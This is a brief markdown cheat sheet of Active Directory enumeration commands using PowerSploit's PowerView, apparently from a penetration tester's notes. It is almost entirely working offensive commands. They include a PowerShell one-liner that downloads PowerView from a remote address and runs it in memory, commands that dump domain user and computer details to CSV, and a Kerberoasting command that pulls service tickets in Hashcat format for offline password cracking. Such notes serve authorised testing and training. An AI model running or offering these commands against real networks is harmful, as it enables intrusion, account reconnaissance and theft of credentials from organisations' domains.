---
description: This is just a living document of things I have needed for domain enumeration
---

# Domain Enumeration

## POWERSPLOIT

Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)

`PS  > IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')`

### Domain Users

`Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-CSV users.csv`

### Domain Computers

`Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv`

### SPN Ticket Request

`Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`

## 

